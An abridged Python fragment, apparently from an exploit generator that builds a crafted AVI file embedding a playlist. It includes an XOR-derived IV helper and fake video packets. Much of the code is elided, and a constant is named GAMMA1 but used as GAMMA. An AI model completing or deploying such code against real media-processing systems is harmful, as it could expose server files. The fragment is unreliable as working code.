...
GAMMA1 = '\x14\x0f\x0f\x10\x11\xb5"=yXw\x17\xff\xd9\xec:'
...
def echo_block(block):
    assert len(block) == 16
    iv = ''.join(map('{:02x}'.format, [x ^ ord(y) for (x, y) in zip(block, GAMMA)]))
...
def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3):
    ...
    dcpkt = '00dc' + struct.pack('<I',
                                  fake_packet_len) + '\x00' * fake_packet_len
